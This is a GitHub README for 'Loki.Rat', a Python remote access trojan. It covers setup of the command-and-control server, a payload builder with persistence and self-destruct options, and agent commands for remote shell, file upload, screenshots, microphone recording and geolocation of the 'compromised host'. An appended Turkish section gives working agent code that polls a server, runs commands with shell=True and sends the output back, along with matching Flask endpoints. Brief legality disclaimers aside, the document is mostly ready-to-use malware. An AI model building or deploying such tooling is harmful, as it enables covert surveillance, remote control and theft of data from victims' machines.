# Pegasus Loki Rat

# PR Düzeltme Denemesi


![Loki.Rat](https://github.com/sobri3195/pegasus-loki-rat/blob/master/Lokirat.jpg)

Loki.Rat is a fork of the [Pegasus Loki RAT](https://github.com/sobri3195/Ares), it integrates new modules, like recording , lockscreen , and locate options.
Loki.Rat is a Python Remote Access Tool.

# Join our Telegram Channel [Loki.Rat](https://t.me/cybersecuritydown)

[![How to Use Loki.Rat]

Warning: Only use this software according to your current legislation. Misuse of this software can raise legal and ethical issues which I don't support nor can be held responsible for.
![Loki.Rat](https://3.bp.blogspot.com/-hCo9eJTSH5Y/WknUCULBwUI/AAAAAAAAAtY/i08DjoFqwLUsmnXhI7e5YX9AJuZmrjitQCLcBGAs/s1600/1234.png)

Loki.Rat is made of two main programs:

    A Command aNd Control server, which is a Web interface to administer the agents
    An agent program, which is run on the compromised host, and ensures communication with the CNC

The Web interface can be run on any server running Python. The agent[Payload] can be compiled to native executables using pyinstaller.

# Setup

Install The Loki.Rat

Open a terminal windows and type this command :

```
     git clone https://github.com/sobri3195/pegasus-loki-rat.git
     cd Loki.Rat
```

 Install the Python modules requirements:

```
     pip install -r requirements.txt
```

 Initialize the database:

```
     cd server
    ./loki.py initdb
```

 In order to compile Windows agents on Linux, setup wine (optional):

```
     ./wine_setup.sh
```

## Server

 Run with the builtin (debug) server:

```
     ./loki.py runserver -h 127.0.0.1 -p 8080 --threaded
```

 Or run using gunicorn:

```
     gunicorn loki:app -b 127.0.0.1:8080 --threads 20
```

 The server should now be accessible on http://127.0.0.1:8080

## Payload

 Run the Python payload (update config.py to suit your needs):

```
     cd payload
     ./payload.py
```

 Build a new payload to a standalone binary:

```
     ./builder.py -p Linux --server http://localhost:8080 -o payload
     ./payload
```

 To see a list of supported options, run ./builder.py -h

```
     ./payload/builder.py -h
     usage: builder.py [-h] -p PLATFORM --server SERVER -o OUTPUT
                    [--hello-interval HELLO_INTERVAL] [--idle_time IDLE_TIME]
                    [--max_failed_connections MAX_FAILED_CONNECTIONS]
                    [--persistent]

     Builds an Loki.Rat payload

     optional arguments:
     -h, --help            show this help message and exit
     -p PLATFORM, --platform PLATFORM
                         Target platform (Windows, Linux).
     --server SERVER       Address of the CnC server (e.g http://127.0.0.1:8080).
     -o OUTPUT, --output OUTPUT
                         Output file name.
     --hello-interval HELLO_INTERVAL
                        Delay (in seconds) between each request to the CnC.
     --idle_time IDLE_TIME
                         Inactivity time (in seconds) after which to go idle.
                         In idle mode, the agent pulls commands less often
                         (every <hello_interval> seconds).
     --max_failed_connections MAX_FAILED_CONNECTIONS
                         The agent will self destruct if no contact with the
                         CnC can be made <max_failed_connections> times in a
                         row.
     --persistent          Automatically install the agent on first run.
```

![Pegasus-Loki.Rat]
Supported payload commands

```
     <any shell command>
     Executes the command in a shell and return its output.

     upload <local_file>
     Uploads <local_file> to server.

     download <url> <destination>
     Downloads a file through HTTP(S).

     zip <archive_name> <folder>
     Creates a zip archive of the folder.

     screenshot
     Takes a screenshot.

     python <command|file>
     Runs a Python command or local file.

     persist
     Installs the agent.

     clean
     Uninstalls the agent.

     exit
     Kills the agent.
   
     record
          -h, --help            show this help message and exit
          -t RECORD_SECONDS, --time RECORD_SECONDS
                                Set a timing in seconds for record. (e.g 10)
          -c CHANNELS, --channel CHANNELS
                                Channel for the microphone (e.g 2).
          -ch CHUNK, --chunk CHUNK
                                Chunk for the microphone (e.g 1024).
          -r RATE, --rate RATE  Rate (e.g 44100).
      
     lockscreen
     lock screen only on windows and Linux with Gnome environnement
   
     Geolocalisation
     locate the target machine , and print the Latitude and Longitude
      
     help
     This help.
```

Muhammad Sobri Maulana - Pegasus Hacker

# Windows PC ile İletişim için API ve Exploit Entegrasyonu

İstemci tarafında (Windows PC) çalışacak bir agent ve sunucu tarafında iletişimi sağlayacak API endpoint'leri oluşturmanız gerekmektedir. İşte adım adım yapılması gerekenler:

## 1. Windows Agent Geliştirme

Windows PC'de arka planda çalışacak, sürekli sunucuya bağlanıp komut alacak ve çıktıları iletecek bir Python betiği oluşturun:

```python
# windows_agent.py
import requests
import subprocess
import time
import json

SERVER_URL = "http://SERVER_IP:5000"  # Sunucu IP'sini buraya girin
AGENT_ID = "WINDOWS_PC_001"  # Benzersiz agent ID

def execute_command(command):
    try:
        result = subprocess.run(
            command, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=60
        )
        return result.stdout, result.stderr, result.returncode
    except Exception as e:
        return "", str(e), -1

def main():
    while True:
        try:
            # Komutları kontrol et
            response = requests.get(
                f"{SERVER_URL}/api/agent_get_commands",
                params={"agent_id": AGENT_ID},
                timeout=30
            )
          
            if response.status_code == 200:
                commands = response.json().get('commands', [])
              
                for cmd in commands:
                    # Komutu çalıştır
                    stdout, stderr, returncode = execute_command(cmd['command'])
                  
                    # Sonucu sunucuya gönder
                    requests.post(
                        f"{SERVER_URL}/api/agent_response",
                        json={
                            'agent_id': AGENT_ID,
                            'command_id': cmd['id'],
                            'output': stdout,
                            'error': stderr,
                            'return_code': returncode
                        }
                    )
          
            # Bağlantı durumunu güncelle
            requests.post(
                f"{SERVER_URL}/api/agent_heartbeat",
                json={'agent_id': AGENT_ID, 'status': 'online'}
            )
          
        except requests.exceptions.RequestException:
            # Bağlantı hatası - yeniden dene
            pass
      
        time.sleep(30)  # 30 saniyede bir kontrol et

if __name__ == "__main__":
    main()
```

## 2. Sunucu API Endpoint'lerini Genişletme

Mevcut Flask API'nize aşağıdaki endpoint'leri ekleyin:

```python
# api.py'ye yeni endpoint'ler ekleyin

@api.route('/agent_get_commands', methods=['GET'])
def agent_get_commands():
    """
    Agent'ın çalıştırması için bekleyen komutları döndürür
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        return jsonify({'commands': []})
  
    # Henüz işlenmemiş komutları al
    commands = Command.query.filter_by(
        agent_id=agent.id, 
        executed=False
    ).order_by(Command.created_at.asc()).all()
  
    command_list = [{
        'id': c.id,
        'command': c.command,
        'created_at': c.created_at.isoformat()
    } for c in commands]
  
    return jsonify({'commands': command_list})

@api.route('/agent_response', methods=['POST'])
def agent_response():
    """
    Agent'tan gelen komut çıktılarını işler
    """
    data = request.get_json()
    agent_id = data.get('agent_id')
    command_id = data.get('command_id')
    output = data.get('output')
    error = data.get('error')
    return_code = data.get('return_code')
  
    if not all([agent_id, command_id]):
        return jsonify({'ok': False, 'error': 'Missing parameters'}), 400
  
    # Komutu bul ve güncelle
    command = Command.query.get(command_id)
    if command:
        command.executed = True
        command.output = output
        command.error = error
        command.return_code = return_code
        command.completed_at = datetime.utcnow()
        db.session.commit()
  
    return jsonify({'ok': True})

@api.route('/agent_heartbeat', methods=['POST'])
def agent_heartbeat():
    """
    Agent'ın canlılık sinyallerini alır
    """
    data = request.get_json()
    agent_id = data.get('agent_id')
    status = data.get('status')
  
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        agent.last_seen = datetime.utcnow()
        agent.status = status
        db.session.commit()
  
    return jsonify({'ok': True})

@api.route('/processes', methods=['GET'])
def get_processes():
    """
- Windows işlemlerini listeler
    """
    agent_id = request.args.get('agent_id')
    if not agent_id:
        return jsonify({'ok': False, 'error': 'agent_id required'}), 400
  
    # Process listesi komutunu agent'a gönder
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if agent:
        command = "tasklist /FO CSV /NH"
        agent.push_command(command)
        return jsonify({'ok': True, 'message': 'Process list command queued'})
  
    return jsonify({'ok': False, 'error': 'Agent not found'}), 404
```

## 3. Veritabanı Modellerini Güncelleme

Model dosyasına yeni alanlar ekleyin:

```python
# models.py
class Agent(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.String(100), unique=True, nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_seen = db.Column(db.DateTime)
    status = db.Column(db.String(20), default='offline')
    commands = db.relationship('Command', backref='agent', lazy=True)

class Command(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    agent_id = db.Column(db.Integer, db.ForeignKey('agent.id'), nullable=False)
    command = db.Column(db.String(500), nullable=False)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    executed = db.Column(db.Boolean, default=False)
    completed_at = db.Column(db.DateTime)
    output = db.Column(db.Text)
    error = db.Column(db.Text)
    return_code = db.Column(db.Integer)
```

## 4. Windows İşlem Yönetimi için Komutlar

Agent'a gönderilebilecek örnek komutlar:

```python
# Process listesi almak için
"tasklist /FO CSV /NH"

# Belirli bir process'i sonlandırmak için
"taskkill /PID <PID> /F"

# Yeni process başlatmak için
"start <program>"

# Dosya işlemleri için
"dir C:\\ /S /B"  # Dosya listesi
"type C:\\path\\to\\file.txt"  # Dosya içeriğini okuma
```

## 5. Bağlantı Kopmaları için Yeniden Bağlanma Mekanizması

Agent'ın bağlantı kopmalarında yeniden bağlanmasını sağlamak için:

```python
# windows_agent.py'ye ekleyin
def robust_request(method, url, **kwargs):
    max_retries = 5
    for attempt in range(max_retries):
        try:
            response = requests.request(method, url, timeout=30, **kwargs)
            return response
        except requests.exceptions.RequestException:
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Üssel backoff
            else:
                raise
    return None
```

## 6. Yapay Zekaya İletilecek Analiz

Windows PC ile iletişim kurmak için geliştirdiğiniz sistem şu bileşenleri içermektedir:

1. **Sunucu API'si**: Flask tabanlı REST API ile komut kuyruğu yönetimi
2. **Windows Agent**: Sürekli çalışan, komutları işleyen ve sonuçları ileten istemci
3. **Veritabanı**: Komutların ve agent durumunun izlendiği SQL veritabanı
4. **İletişim Protokolü**: HTTP/HTTPS üzerinden JSON tabanlı iletişim
5. **Yeniden Bağlanma Mekanizması**: Bağlantı kopmalarını yöneten üssel backoff algoritması

Bu sistemle:

- Windows işlemlerini uzaktan yönetebilirsiniz
- Dosya sistemine erişebilirsiniz
- Komut çıktılarını gerçek zamanlı takip edebilirsiniz
- Bağlantı kopmalarında otomatik yeniden bağlanma sağlayabilirsiniz

**Önemli Not**: Bu tür sistemler yalnızca yetkili sistemlerde ve etik hacking/sistem yönetimi amaçlı kullanılmalıdır. Kullanım öncesi gerekli yasal izinler alınmalıdır.
